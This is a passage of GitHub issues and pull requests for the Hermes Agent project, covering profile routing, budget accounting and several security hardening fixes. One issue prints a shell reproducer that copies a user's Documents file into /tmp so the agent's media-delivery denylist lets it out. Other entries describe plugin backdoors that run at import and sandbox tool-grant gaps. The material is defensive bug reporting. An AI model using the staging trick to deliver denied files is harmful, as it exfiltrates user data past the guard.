signal.title: Desktop Bot Mode misclassifies active remote profiles as local and duplicates rows
signal.text: ## Summary After a v2 remote connection is successfully opened, Bot Mode can render the active remote source's profiles as though they belonged to the local source. This produces duplicate `default`/profile rows and makes the roster look like local bots have been copied into the remote view. ## Environment - Hermes Agent / backend: `v0.20.2` - Desktop source: current `main` at `4323c67dcc6048fc8e311cdff7600d3d6a17807f` - macOS arm64 - Local connection remains available, with a v2 token-authenticated remote connection configured ## Reproduction 1. Keep a local Desktop connection and configure a v2 remote connection. 2. Open a bot/profile from the remote source in Bot Mode. 3. Let the Bot Mode roster refresh. 4. Inspect the Bot Mode list. ## Actual behavior - `profiles.list` returns the active remote source's rich rows. - `mergeMultiSourceRoster()` assumes those rows are always local. - It annotates an active remote row with the local source's handle/identity when the profile name overlaps (especially `default`). - It then appends a second, thin row for the same remote agent from the union roster. - The user sees duplicated rows and local-looking `default` bots while viewing a remote source. ## Expected behavior The rich `profiles.list` rows must be associated with the currently active registry source, not assumed to be local. The remote source's profile should appear once, with its own handle and source label. Profiles from other sources should remain separately routable rows. ## Root cause `apps/desktop/src/plugins/hermes-bots/plugin.js` treats `local` in `mergeMultiSourceRoster(local, union)` as the local machine. In practice, it is the active gateway response, which may be remote after `host.ensureAgent()` activates a remote agent. The plugin also uses one static roster query key, so a remote-to-local (or local-to-remote) switch can briefly reuse the preceding source's roster response. ## Proposed fix 1. Expose the credential-free active registry connection ID through the Plugin SDK state. 2. Scope the Bot Mode roster query key by that source ID. 3. Match rich `profiles.list` rows against the active source ID while merging the union roster. 4. Do not append a thin duplicate when a rich active-source row already exists. ## Regression coverage A regression test should activate a remote source containing `default` while the local source also contains `default`, and assert that: - the remote rich row keeps its description/session data and remote handle; - only one row is emitted for that remote agent; and - the local row stays a separately routable source row.
signal.author: kiyo-e

signal.title: fix(delegation): failed API calls consume the subagent iteration budget, starving the fallback chain
signal.text: ## Summary In subagent execution, the iteration budget is consumed **before** the model API call is made, and `api_call_count` is incremented before it too. A retryable failure — HTTP 429 → `FailoverReason.rate_limit` → `try_activate_fallback` walking `_fallback_chain` — burns the same budget as a successful turn. When a burst of rate limits coincides with a subagent deep in a long code-read (50-90 iterations in), the run can terminate with `exit_reason=max_iterations` before the configured `fallback_providers` chain gets a fair chance to recover, with the 429 as the last visible event. ## Evidence (all verified in code) - `agent/conversation_loop.py:1425` — `api_call_count += 1` happens **before** the API call. - `agent/conversation_loop.py:1433` — `elif not agent.iteration_budget.consume():` also runs **before** the call; a failed call is never refunded (no `refund()` call on error paths). - `agent/iteration_budget.py:37-45` — `consume()`/`refund()` exist; `refund` is not invoked on API failure. - `agent/chat_completion_helpers.py:1695-1757` — `try_activate_fallback` walks `_fallback_chain` on `FailoverReason.rate_limit` / `billing` / `upstream_rate_limit`. - `agent/error_classifier.py:33` — `rate_limit = "rate_limit" # 429 or quota-based throttling — backoff then rotate`. - `agent/agent_init.py:1390-1398` — `_fallback_chain` populated from `fallback_providers` (list) / `fallback_model` (dict); subagents inherit it via `tools/delegate_tool.py:1463` → `fallback_model=parent_fallback` → `run_agent.py` child construction. - `tools/delegate_tool.py:1352-1355` — per-subagent iteration cap, default 50 (config currently 200). ## Observed manifestation Ten red-team subagents were dispatched to audit the secrets-exfiltration hardening. Six exited with `exit_reason=max_iterations` after 58-90 tool calls each, each with a terminal `HTTP 429: rate limit exceeded` after 3 retries in the transcript — despite `fallback_providers: deepseek/deepseek-v4-flash` configured and the fallback chain verified wired end-to-end. The 429s were retryable; the budget was not. The fallback chain never engaged because the subagents had exhausted their iteration budget on deep code reads, and every failed API call had consumed budget as if it were a successful turn. ## Proposed fix 1. **Refund or don't consume on API failure**: do not consume an iteration (or `refund()` it) when the API call fails with a retryable classification and the fallback chain is about to engage — a fallback attempt is part of the same logical turn, not a new iteration. 2. **Decouple retry/fallback from the turn budget**: count `api_call_count` for observability, but gate loop exit on a separate budget that excludes provider-recovery attempts, or cap recovery attempts independently (e.g. N fallback tries per logical turn). 3. **Test**: a subagent whose primary provider 429s on every call, with a healthy `fallback_providers` entry, must complete the task — not die with `max_iterations` after burning the budget on failed calls. ## Impact - Subagents on rate-limited primary providers silently fail instead of using the configured backup — the exact failure the `fallback_providers` feature exists to prevent. - Affects every delegation workload: red-team audits, research fan-outs, code reviews — anything deep enough to approach the iteration cap. ## Severity HIGH (reliability/availability; the configured resilience path is defeated by budget accounting).
signal.author: andrexibiza

signal.title: [Security]: Close use-time, provenance, and authority gaps behind #88232 / #88435
signal.text: ## Problem #88232 closed one concrete incident path: malformed SSH host input could retain a pasted password, reach `desktop.log`, and then escape through a public debug share. #88435 proposes a much broader ten-part hardening campaign. Several pieces are directionally valuable, but review of head `194ecf5a3c4fdb32708b9bc79759e46d03aa8b00` found a common boundary problem: > Security decisions are often made against an early representation — a script path at create time, a final pathname, an inbound allowlist, a syntactically parseable JSON file, or a wrapper entrypoint — rather than against the final actor, bytes, authority, destination, and state at use time. That leaves bypasses even when the individual guard appears correct in isolation. This issue tracks that one class across cron execution, media delivery, outbound routing, credential persistence, and support-bundle logging. It is not a request to reject all of #88435; several fixes can land independently. It is the class-closure work needed before the campaign can be treated as an end-to-end security boundary. ## Confirmed gaps ### 1. `no_agent` cron approval is not bound to the bytes that execute F3 scans a script at job creation/update. The job stores a mutable path, not an approved digest or immutable payload. A script can therefore be benign when scanned and then be edited, replaced, or symlink-swapped before a later fire. Existing persisted jobs also never pass through the new create/update scan unless they are edited. The finite content-pattern scan is defense in depth, not containment. The branch's own F4 regression deliberately constructs a config rewrite that F3 cannot recognize, proving that script behavior can diverge from the create-time verdict. Required invariant: > The exact executable object authorized for a job must be the object executed, and execution must not receive ambient authority merely because its source text avoided a pattern list. ### 2. F4 restores `config.yaml` after execution instead of preventing unauthorized use The runtime guard snapshots `config.yaml`, runs the script with ordinary subprocess authority, and restores the file after completion if the bytes changed. That leaves several race/data-integrity edges: - a transient policy flip can be observed by another thread/process while the script is still running; - a detached child can perform its first write after the parent exits, so no initial tamper detection occurs and the settle loop never starts; - the fixed 1/2/4-second settle window is not a security boundary; - a legitimate concurrent operator edit is indistinguishable from malicious script tampering and can be overwritten by restoration; - restoration failure leaves the modified security policy live. Snapshot/restore can be useful recovery telemetry, but it cannot substitute for filesystem/process isolation or a pre-execution authority check. ### 3. F3 and F6 compose into a staging bypass F6 makes known user-data locations non-deliverable while deliberately preserving temp/cache paths for agent-produced artifacts. Because the decision is based on the final pathname, denied data can be copied into an allowed staging location and then delivered. A non-secret canary reproducer is sufficient: ```sh cp "$HOME/Documents/hermes-media-canary.txt" /tmp/hermes-report.txt printf 'MEDIA:/tmp/hermes-report.txt\n' ``` The original path is denied. The copied file is accepted because provenance was discarded and `/tmp` is treated as an artifact location. The same shape applies to cache roots, operator-allowlisted roots, and fresh home-root outputs. A denylist over familiar directory names also does not cover custom data directories, external volumes, network mounts, localized folders, repositories, or organization-specific sync roots. Required invariant: > Moving or copying denied input into a trusted output directory must not silently convert it into an authorized deliverable. ### 4. Cron destination ownership is modeled from inbound authorization and enforced through incomplete doors F9 correctly identifies that raw `platform:chat_id` targets can bypass normal platform authorization. The proposed implementation then treats inbound user allowlists as evidence of outbound destination ownership. Those are different principals on several platforms: - a Discord user ID is not a Discord channel ID; - a Slack user ID is not a Slack channel ID; - an inbound wildcard or sender allowlist is not an outbound exfiltration grant. The check is also placed in `create_job_with_scheduler_registration()` and the model-tool update wrapper rather than the core `cron.jobs.create_job()` / `update_job()` mutation primitives. Direct callers, plugins, migrations, persisted-store edits, and old jobs can therefore bypass the policy. Finally, validation occurs at create/update time only. Removing a target from an allowlist later does not revoke an already-persisted job. Required invariant: > Outbound authority must be represented explicitly and revalidated at fire time against connection × profile × platform × chat/thread identity. ### 5. Corrupt-auth handling still fails open on structural and truncation states F10 raises for malformed JSON/UTF-8, but an existing zero-byte or whitespace-only `auth.json` is treated as a legitimate empty store. Syntactically valid but structurally invalid data also falls back to a new empty provider store. Examples that must not be silently interpreted as an intentional empty credential store: ```json [] ``` ```json {} ``` ```json {"provider": {"nous": "..."}} ``` A crash-truncated file, an unsupported schema version, a mistyped top-level key, and an intentionally initialized empty store are materially different states. Conflating them recreates the read-empty/write-empty credential-erasure path F10 is intended to close. ### 6. Windows credential-write failure policy is inconsistent The Claude credential writer refuses persistence and deletes the new file when ACL restriction cannot be enforced. Hermes' own `auth.json` writer instead keeps the written credential store and logs a warning when Windows ACL enforcement fails. Therefore the advertised invariant — refuse-and-delete when a credential file cannot be restricted — is not class-wide. The behavior depends on which credential path wrote the secret. The Windows verification helper also parses localized `icacls` display text. Native-Windows tests must prove both positive ownership recognition and rejection of unrelated explicit/inherited ACEs; a parser that simply fails to identify an ACE must not return success. ### 7. The merged SSH fix closes the reproduced path, not the final support-bundle sink #88232 correctly rejects the exact `host:PASSWORD` incident shape and adds defensive target redaction. Residual compositions remain worth pinning: - comma-mangled host plus a colon secret can hit the comma error branch before the secret-hiding branch; - a colon-containing credential can be only partially masked by a one-segment regex; - IPv6 and credential-position parsing share colon syntax; - rejected raw connection input should never be interpolated back into errors or lifecycle logs; - the debug-share/public-paste boundary still needs a final whole-payload secret scrub, independent of upstream parser correctness. The durable class closure is structured safe logging plus a final egress scrub, not an indefinitely growing family of SSH-target regular expressions. ## Interlocks ### Direct - #88232 — merged incident-path repair for SSH host validation and logging. - #88435 — proposed ten-part hardening campaign reviewed here. - #82936 — cross-profile ambient-secret inheritance into subprocesses; directly relevant to what a cron script process receives. - #88335, #88337, #88339, #88343 — current cron recovery semantics that any rebase and execution-time guard must preserve. ### Related but separately owned - #82010 — explicit zero-tool state and empty toolsets failing open. This issue does not duplicate that acceptance matrix. - #88698 — MCP dual-era protocol correctness/conformance. This issue does not own protocol negotiation or cache conformance. ## Acceptance criteria ### Cron executable identity and containment - [ ] A job persists an immutable script payload or a cryptographic identity for the approved bytes. - [ ] Fire-time execution verifies that identity immediately before spawn; changed/replaced/symlink-swapped scripts fail closed. - [ ] Existing persisted `no_agent` jobs are reconciled/migrated rather than grandfathered around the new boundary. - [ ] Script execution receives an explicit capability envelope for filesystem, environment, network, and child-process access; ambient gateway/profile secrets are not inherited by default. - [ ] `config.yaml`, auth stores, pairing state, and other control-plane files cannot be transiently modified by the script lane. - [ ] A concurrent legitimate operator edit is never overwritten by a stale script-run snapshot. - [ ] Cancellation, timeout, detached-child, gateway restart, and cron recovery paths preserve the same invariant. ### Media provenance - [ ] Copying a denied canary file into temp/cache/fresh-output roots does not authorize delivery. - [ ] Trusted delivery is based on an operator grant or verifiable agent-output provenance, not only final pathname/mtime. - [ ] Every media-send path, including cron and direct gateway delivery, consumes the same final validator. - [ ] Symlink, hard-link where detectable, container-path translation, external-volume, and cross-profile cases are covered. ### Outbound destination authority - [ ] Core `create_job()` and `update_job()` enforce destination policy; wrappers cannot be the only gate. - [ ] A dedicated outbound destination grant is distinct from inbound sender authorization. - [ ] Grants are keyed by connection/profile/platform/chat/thread and cannot collide across same-named profiles or connections. - [ ] Destinations are revalidated immediately before each fire so revocation is effective for existing jobs. - [ ] Existing persisted jobs with raw targets are migrated, quarantined, or fail closed until explicitly approved. ### Credential-store integrity - [ ] Missing store, explicitly initialized empty store, zero-byte/truncated store, malformed JSON, wrong schema, and unsupported version are distinct states. - [ ] Existing zero-byte/whitespace/wrong-schema stores fail closed and cannot feed a later empty overwrite without explicit operator recovery. - [ ] Recovery copies are versioned/non-overwriting and preserve the original bytes. - [ ] Every credential write path has one documented ACL-failure policy; no path silently retains a credential that the policy says must be private. - [ ] Native Windows tests exercise localized/account-SID output, inherited and explicit group ACEs, missing current-user ACE, and enforcement failure. ### Logging and support bundles - [ ] Rejected connection input is represented by structured safe fields, never echoed raw. - [ ] Combined malformed-input cases and IPv6 are covered. - [ ] Debug-share/support-bundle generation applies a final secret scrub to the complete payload before upload/publication. - [ ] Tests use canary secrets to prove the sink does not publish material missed by an upstream parser-specific redactor. ### Integration evidence - [ ] The work is rebased onto current `main`, including the merged cron recovery train and current delivery/auth implementations. - [ ] Tests assert final composed behavior, not only intermediate helper return values. - [ ] Linux, macOS, and native Windows CI run the relevant boundary tests. - [ ] Mutation/adversarial tests prove each guard fails when removed and cannot be bypassed through a sibling entrypoint. ## Non-goals This issue does not own: - the complete MCP 1.x/2.x protocol matrix (#88698); - the complete explicit-zero-tool contract (#82010); - every possible prompt-injection defense; - a general-purpose sandbox product unrelated to the `no_agent` execution boundary. ## Closure statement This class is complete when security posture is attached to the final executable bytes, actor/profile, outbound destination, data provenance, credential-store state, and publication sink — and those facts are revalidated at the moment authority is exercised, not inferred once from an earlier string, path, wrapper, or parser result.
signal.author: andrexibiza

signal.title: fix(plugins): stop tampered directory plugins from running backdoors before rejection
signal.text: ## What does this PR do? Enabled user and project directory plugins now have their Python entrypoint verified by the host before any plugin-owned code executes. Previously, a tampered `__init__.py` could run top-level backdoor or persistence code before a plugin's later self-check rejected registration. The host now records integrity evidence outside plugin directories and executes the exact bytes that passed verification. ### Symptom A directory plugin with stale integrity evidence could be rejected during `register(ctx)`, but top-level code in its modified `__init__.py` had already executed. In the isolated Windows reproduction, this ordering allowed a sentinel write before registration was denied. ### Impact Users who enable user or project directory plugins were exposed to one execution of a tampered entrypoint before the existing registration-time rejection. This creates a local backdoor and persistence opportunity within the Hermes process privileges. Bundled plugins and pip entry points are outside this directory-plugin trust boundary. ### Bug Cause **Trigger:** `hermes_cli/plugins.py:_load_directory_module` imported an enabled user or project directory plugin before `register(ctx)` could perform a plugin-owned integrity check. **Causal chain:** 1. A directory plugin was enabled with evidence for its original `__init__.py`. 2. The entrypoint was modified while the old evidence remained. 3. Python executed the modified module's top-level code before registration was rejected. **Why it is wrong:** A check performed by the plugin cannot establish trust before importing that same plugin. Import is already arbitrary code execution. **Working sibling / contrast:** Bundled plugins are shipped with Hermes, while pip entry points use package installation provenance. This change is limited to enabled user, project, and git-backed directory plugins. **Ruled out:** Moving the existing self-check earlier inside `register(ctx)` cannot close the gap because module import must complete before the host can call that function. ### Fix - Store SHA-256 evidence under the active Hermes profile, outside plugin-controlled directories. - Reject missing, malformed, duplicate, symlinked, non-regular, path-mismatched, or stale evidence before import. - Read and verify an entrypoint once, then compile and execute those same verified bytes to avoid a second path lookup. - Seed existing enabled directory plugins during config migration and maintain evidence across CLI, dashboard, install, update, enable, and remove flows. - Serialize evidence updates across threads and processes so concurrent lifecycle operations cannot lose records. ## Related Issue Closes #83646 ## Type of Change - [x] Security fix ## Changes Made - `hermes_cli/plugin_integrity.py` - add the host-owned evidence store, strict validation, safe entrypoint reads, and cross-process update locking. - `hermes_cli/plugins.py` - verify enabled directory entrypoints before compiling and executing the verified bytes. - `hermes_cli/plugins_cmd.py` - maintain evidence across install, update, enable, disable, remove, dashboard, and multi-select lifecycle paths. - `hermes_cli/config_defaults.py` and `hermes_cli/config_migrations.py` - seed evidence once for existing enabled directory plugins. - `tests/hermes_cli/test_plugin_integrity.py` and `tests/hermes_cli/test_plugins_cmd.py` - cover tampering, unsafe evidence and files, migration, concurrency, and lifecycle behavior. ## How to Test 1. In an isolated `HERMES_HOME`, enable a clean directory plugin and record its entrypoint evidence. 2. Keep the old evidence, replace `__init__.py` with top-level sentinel and registration-marker writes, and load plugins in a fresh process. Confirm the plugin reports an integrity mismatch and neither marker exists. 3. Restore the exact recorded entrypoint and confirm the clean plugin imports and registers. 4. Automated verification already run locally: 112 related plugin tests and 14 migration-focused config tests passed. ```bash scripts/run_tests.sh tests/hermes_cli/test_plugin_integrity.py tests/hermes_cli/test_plugins.py tests/hermes_cli/test_plugins_cmd.py tests/hermes_cli/test_plugin_scanner_recursion.py -q scripts/run_tests.sh tests/hermes_cli/test_config.py -k 'migration or migrate' -q ``` ## Checklist ### Code - [x] I've read the [Contributing Guide](https://github.com/NousResearch/hermes-agent/blob/main/CONTRIBUTING.md) - [x] My commit messages follow [Conventional Commits](https://www.conventionalcommits.org/) (`fix(scope):`, `feat(scope):`, etc.) - [x] I searched for [existing PRs](https://github.com/NousResearch/hermes-agent/pulls) to make sure this isn't a duplicate - [x] My PR contains **only** changes related to this fix - [x] I've run the repository test entry on the relevant tests and all 126 tests pass - [x] I've added tests for the security fix - [x] I've tested on my platform: Windows 10 ### Documentation & Housekeeping - [x] Relevant documentation: N/A - this hardens existing plugin behavior without adding user-facing configuration - [x] `cli-config.yaml.example`: N/A - no user-facing config key was added or changed - [x] `CONTRIBUTING.md` or `AGENTS.md`: N/A - no contributor workflow changed - [x] Cross-platform impact considered: Windows and POSIX locking and filesystem behavior are covered - [x] Tool descriptions/schemas: N/A - no model tool behavior changed

signal.title: fix(tools): empty execute_code capability set denies all sandbox tools
signal.text: ## What does this PR do? Fixes a security-hardening gap where `execute_code`'s sandbox capability resolution conflated an **explicit empty grant** with an **omitted grant** via truthiness. An explicit `enabled_tools=[]` (or a non-empty list with no sandbox overlap) was silently broadened to *every* `SANDBOX_ALLOWED_TOOLS` stub, so a session that disabled its sandbox tools still got them all re-exposed inside `execute_code`. This PR preserves tri-state semantics in both the local (UDS) and remote (file-RPC) dispatch paths: - `enabled_tools=None` → documented legacy default → all sandbox tools. - `enabled_tools=[]` → **deny-all** (no nested tool stubs are generated). - non-empty → exact intersection with `SANDBOX_ALLOWED_TOOLS` (empty intersection denies all). ## Related Issue Part of the SECURITY-AUDIT-42 hardening campaign (EPIC #82591), class `SECURITY-CLASS-faf9d60580300e16`, consensus contract `R2-C-003`. Fixes #84271 ## Type of Change - [x] 🔒 Security fix ## Changes Made - `tools/code_execution_tool.py` — replace the `if enabled_tools else set()` truthiness check with `_resolve_sandbox_tools()` so the local UDS and remote file-RPC paths share one tri-state helper. - `tests/tools/test_code_execution.py` — correct the one test that encoded the old fallback-to-all behavior, add three execute_code regression tests (`[]` / non-overlap / `None`), and unit-test the shared helper for all four states. - `tests/agent/test_plugin_prompt_sections.py` — pin `resolve_context_cwd` so the plugin-section cache assertion is not coupled to a live detached-HEAD git snapshot (CI merge checkouts). ## How to Test 1. `uv run python -m pytest tests/tools/test_code_execution.py -q` → 44 passed. 2. `uv run python -m pytest tests/tools/test_code_execution.py -k "test_empty_enabled_tools_denies_all or test_nonoverlapping_tools_deny_all or test_none_enabled_tools_legacy_default"` → 3 passed. 3. The two deny-all tests fail on `origin/main` (they observed `success` with the `terminal` stub present) and pass on this branch — proving the exact broadening this PR removes. ## Checklist ### Code - [x] I've read the [Contributing Guide](https://github.com/NousResearch/hermes-agent/blob/main/CONTRIBUTING.md) - [x] My commit messages follow [Conventional Commits](https://www.conventionalcommits.org/) (`fix(scope):`, `feat(scope):`, etc.) - [x] I searched for [existing PRs](https://github.com/NousResearch/hermes-agent/pulls) to make sure this isn't a duplicate - [x] My PR contains **only** changes related to this fix/feature (no unrelated commits) - [x] I've run `pytest tests/tools/test_code_execution.py -q` and all tests pass - [x] I've added tests for my changes (required for bug fixes, strongly encouraged for features) - [x] I've tested on my platform: macOS 15 (arm64) ### Documentation & Housekeeping - [x] I've updated relevant documentation (README, `docs/`, docstrings) — or N/A - [x] I've updated `cli-config.yaml.example` if I added/changed config keys — or N/A - [x] I've updated `CONTRIBUTING.md` or `AGENTS.md` if I changed architecture or workflows — or N/A - [x] I've considered cross-platform impact (Windows, macOS) per the [compatibility guide](https://github.com/NousResearch/hermes-agent/blob/main/CONTRIBUTING.md#cross-platform-compatibility) — or N/A

signal.title: fix(desktop): keep cron, messaging and search inside the active profi…
signal.text: ## Summary The sidebar keeps cron and messaging session caches warm by fetching them cross-profile, but in a concrete profile view those caches were rendered unfiltered: a profile like `sabby` showed another profile's Telegram threads in the messaging platform sections, and Pinned resolution could surface cron/messaging rows from other profiles. Session search also hit every profile's DB regardless of scope, and the per-slice messaging fetches (seed + per-platform pager) always asked for `profile=all`, bypassing the batched endpoint's single-scope behavior. This PR makes every sidebar surface answer to the same profile scope as Recents: - **`filterByProfile()`** — display-side filter applied to the cron and messaging caches before they feed Pinned resolution and the messaging platform sections. No-op reference passthrough in explicit All Profiles mode; untagged sessions normalize to `default`, so single-profile users are unaffected. - **Scoped fetches** — the messaging seed fetch and per-platform pager now request the active profile, matching what the batched `/api/profiles/sessions/sidebar` endpoint already does for every slice (the #65710/#42651/#70629 single-scope contract). - **Scoped search** — `searchSessions()` takes an optional profile and routes `/api/sessions/search?profile=...`; the sidebar clears FTS hits on scope change and ignores stale-scope responses while a scoped request is in flight. - **Remote correctness** — the Electron remote fan-out for the batched sidebar endpoint scopes the cron and messaging slices to the same `recents_profile` as recents (previously hardcoded to `all`), keeping remote-profile setups consistent with the local endpoint. ## Notes - No new endpoint parameters: the change follows the backend's existing single-scope semantics. - Preserves the reference-identity invariant: `filterByProfile` returns the input array unchanged when nothing is filtered, so sidebar memos don't recompute on no-ops. ## Verification - `npm run check:lint` — clean (typecheck ×3, eslint 0 errors) - `npm run test:ui` — 3683 passed (413 files) - `npm run test:desktop:platforms` — skipped: needs packaged `release/` artifacts from a full build (exercises installer boot, not store logic)

signal.title: fix(commandcode): accept base_url kwarg in fetch_models overrides
signal.text: ## Problem The CommandCode provider profiles (`commandcode`, `commandcode-anthropic`) are unusable from the model picker and `/model` switch: 1. **Zero models in the picker.** The generic live-fetch path in `hermes_cli/models.py` (`provider_model_ids`) calls `profile.fetch_models(api_key=..., base_url=...)` for api_key plugin providers. Both CommandCode overrides only accepted `api_key`/`timeout`, so every call raised `TypeError`, which was silently swallowed — the provider ended up with an empty model list and never entered the disk cache. 2. **"Unknown provider" on switch.** `resolve_provider_full` / `get_provider` only knew models.dev + `HERMES_OVERLAYS`. Plugin-only providers (commandcode, tencent-tokenhub, ...) are absent from both, so `/model commandcode/...` failed even though the picker lists them (via `CANONICAL_PROVIDERS` auto-extension). ## Fix - Both `fetch_models` overrides accept (and ignore) the `base_url` kwarg, matching the base `ProviderProfile.fetch_models` signature. - `get_provider` falls back to `providers.get_provider_profile()` before giving up, mapping the profile's `api_mode` to the `ProviderDef` transport. ## Verification - New regression tests: `fetch_models` accepts `base_url`; `resolve_provider_full` resolves both profiles with correct transports (`openai_chat` / `anthropic_messages`). - `tests/plugins/model_providers/test_commandcode_profile.py` + `test_main_model_custom_provider_normalization.py`: 33 passed. - End-to-end: `cached_provider_model_ids("commandcode")` returns the live 55-model list; `commandcode-anthropic` returns the 7 `claude-*` models.

signal.title: fix(desktop): repair chrome-sandbox setuid perms on the --build-only path
signal.text: Fixes #58593 (relaunch-gate half of the reported symptom — the other half, 'the update is offered again', was addressed by the detached-update rewrite in #83634). ## Problem On Linux, every `hermes update` that triggers a desktop rebuild ends with the app refusing to auto-relaunch: ``` no relaunch (manual): Update complete, but the rebuilt app can't relaunch itself (its sandbox helper needs root ownership). Reopen Hermes to finish. ``` Observed 8 times across one week of client updates on a source-install deployment (hand-off log excerpt available on request). ## Root cause Two facts combine: 1. `electron-builder` recreates `release/linux-unpacked/chrome-sandbox` with normal user ownership and mode `0755` instead of the required `root:root` / `4755` setuid configuration. 2. The existing repair — `_desktop_linux_sandbox_fixup()` in `hermes_cli/main.py` — only runs on the **launch** path of `hermes desktop`. The `--build-only` path (used by `hermes update`'s rebuild step and the detached desktop-update hand-off) `return`s **before** that code, so the artifact is left with broken perms. `scripts/desktop-update/posix.sh`'s relaunch gate then correctly refuses to relaunch an app whose sandbox helper lacks setuid (Electron refuses to boot otherwise), and the user must reopen manually. Nothing in the update flow ever repairs the perms. ## Fix Call the existing `_desktop_linux_sandbox_fixup()` on the `--build-only` packaged branch, so the artifact is launchable the moment the build completes: - Best-effort, same as on the launch path: when `sudo` is unavailable the fixup prints its own diagnostics and the launch path remains a second chance. - No-op on non-Linux platforms (the fixup guards on `sys.platform`). - No new code paths, no behavior change for the launch path, no `--no-sandbox` opt-in. ## Tests New `test_gui_build_only_repairs_chrome_sandbox` asserts the fixup is invoked exactly once with the packaged executable on the build-only path. Full existing suite passes: ``` tests/hermes_cli/test_gui_command.py: 27 passed, 5 skipped ```

signal.title: fix(cron): deliver a multiplexed profile's job from its own bot
signal.text: ## The bug Under `gateway.multiplex_profiles`, a scheduled job created in a secondary profile is **delivered by the primary profile's bot**. Observed on a two-profile install (two Telegram bots, one gateway): a job in the `medicina` profile — correct `deliver: origin`, correct origin block — arrived in the primary profile's chat, sent by the primary's bot. Nothing fails loudly. The output simply shows up under the wrong identity, which also leaks one bot's activity into another bot's conversation. ## Root cause The multiplex ticker scopes each profile's cron **store**, but hands every profile the **same adapter registry**: ```python # cron/scheduler_provider.py for entry in profile_homes: home_token = set_hermes_home_override(str(home)) with use_cron_store(home): # ← store IS scoped cron_tick(adapters=adapters, ...) # ← registry is NOT (primary's) ``` That asymmetry is invisible on most platforms, because two things line up: 1. a cron delivery target carries only `platform` + `chat_id` and **no profile** (`cron/scheduler.py::_resolve_single_delivery_target`); 2. delivery resolves an adapter out of whatever registry it is handed (`gateway/delivery.py::resolve_delivery_transport`). On Telegram a private chat reports the **user's own id** as `chat.id`, so every bot serving that human shares one `chat_id`. The lookup in the wrong registry therefore *succeeds* instead of failing — and the wrong bot sends. ## The fix `start()` / `_start_multiplex()` accept `profile_adapters` (profile name → that profile's registry) and select per profile. Fallback to the primary registry is deliberate, for three cases: the profile's adapters failed to connect, the `profile_homes` entry is a bare path with no name, or an older gateway passes no mapping at all. **Wrong-bot is recoverable; silently dropping a job's output is not.** The gateway builds the mapping from `runner._profile_adapters` plus the active profile's own `runner.adapters`. External cron providers never receive the new kwarg — it is only passed to `InProcessCronScheduler` — so third-party provider implementations are unaffected. ## Tests `tests/gateway/test_multiplex_cron_delivery_registry.py` — 5 cases: | Case | Asserts | |---|---| | `test_each_profile_ticks_with_its_own_registry` | the core bug: secondary gets its own adapters | | `test_secondary_without_registry_falls_back_to_primary` | no registry → still delivers | | `test_empty_registry_is_not_selected` | `{}` means "nothing connected" → fall back | | `test_bare_path_entries_still_supported` | nameless entry → no crash, no guessing | | `test_no_profile_adapters_keeps_legacy_behaviour` | older caller unchanged | The four non-legacy cases fail on unpatched `main` (verified against a pristine clone); all five pass with the fix. Full local run on Windows, `tests/gateway/ tests/cron/ tests/test_hermes_state.py`: | | failed | passed | |---|---|---| | baseline (unpatched) | 79 | 6567 | | with this change | **75** | **6600** | Zero new failures; the 4 that disappear are this PR's own tests. The 75 remaining are pre-existing on Windows (POSIX `0700`/`0600` permission assertions that NTFS does not implement). Both runs reproduced twice with identical numbers. ## Related Same family as #88381 and #88404 — profile identity not carried across a seam under `multiplex_profiles`. This one is the delivery side of cron.

signal.title: fix(cli): honour model_aliases api_key, stop cross-provider key leak (#83612)
signal.text: ## What does this PR do? A `model_aliases:` entry that points at a custom endpoint could not authenticate, and leaked a credential doing it. Two compounding causes, exactly as reported in #83612: 1. **The alias's key was never read.** `DirectAlias` carried only `(model, provider, base_url)`, so `_load_direct_aliases()` silently discarded any `api_key` in the config entry. 2. **The wrong key was sent instead.** `switch_model()` resolves credentials against the *default* provider, and only afterwards overwrites `base_url` with the alias endpoint — keeping the key it had already resolved. So switching to the alias 401s, and the default provider's secret goes out to an unrelated third-party host (including on the `/v1/models` validation probe). `hermes chat -m <alias>` had the matching half: `oneshot` passed the alias's `base_url` to `resolve_runtime_provider()` but not its key, so a custom host whose vendor key isn't derivable from the hostname never authenticated. **Why this approach:** rather than add a second credential-selection path, the alias override now re-resolves through `resolve_runtime_provider(explicit_base_url=...)`. That branch already honours an explicit key first and host-gates env-key fallbacks (#28660), so the hardened logic is reused rather than duplicated. The pre-alias key is kept only when the alias resolves to the **same host** it was resolved for — which is what keeps users pinned to a custom endpoint working — and dropped otherwise. Because the drop is keyed on host mismatch rather than on which branch produced the key, sessions on **built-in** providers (Anthropic, OpenAI, …) are covered too, not just custom ones. ## Related Issue Fixes #83612 Related prior work, neither of which is in `main` (`DirectAlias` still carries only `(model, provider, base_url)`): - #71410 — open, fixes the leak for the custom-provider branch. Its last review round flagged that built-in/registered-API-key providers still leak with direct aliases; the host-mismatch rule here covers that case, with tests. Happy to fold this into that PR instead if the author prefers. - #66409 — proposed the same `DirectAlias` `api_key`/`key_env` fields, closed by its author (#66437 was closed as its duplicate). ## Type of Change - [x] 🐛 Bug fix (non-breaking change that fixes an issue) - [ ] ✨ New feature (non-breaking change that adds functionality) - [x] 🔒 Security fix - [ ] 📝 Documentation update - [x] ✅ Tests (adding or improving test coverage) - [ ] ♻️ Refactor (no behavior change) - [ ] 🎯 New skill (bundled or hub) ## Changes Made - `hermes_cli/model_switch.py` - `DirectAlias` gains `api_key` / `key_env`, both defaulted — existing positional construction `DirectAlias(model, provider, base_url)` is unchanged. - `_load_direct_aliases()` reads both from `model_aliases:` entries. - New `direct_alias_api_key()` resolves a literal key, a `"${VAR}"` reference, or `key_env`. Env reads go through `_scoped_key_env` so a multiplexed gateway can't hand one profile another profile's key. - The direct-alias override re-resolves credentials against the alias endpoint, and reuses the pre-alias key only on a host match. The resolver's `no-key-required` placeholder is normalised so a same-host credential still outranks it. When the alias declares its own key the resolver is skipped entirely, avoiding a second local-endpoint model probe. - `hermes_cli/oneshot.py` — passes the alias's key as `explicit_api_key` alongside the existing `explicit_base_url`. - `hermes_cli/runtime_provider.py` — the direct-alias branch of `_resolve_named_custom_runtime()` gains the `OLLAMA_API_KEY` host gate it was missing. `_host_derived_api_key()` documents that it deliberately skips `OLLAMA_API_KEY` because an explicit host-matched path handles it (GHSA-76xc-57q6-vm5m); that path existed for named custom providers but not for direct aliases, so an Ollama Cloud alias resolved no key at all once routed through it. - `tests/hermes_cli/test_model_alias_credentials_83612.py` — new, 19 cases. - Docs for the new keys: `cli-config.yaml.example`, `website/docs/user-guide/configuring-models.md`, `website/docs/reference/slash-commands.md`, and the agent-facing `skills/autonomous-ai-agents/hermes-agent/references/providers-and-models.md`. ## How to Test Reproduce the bug on 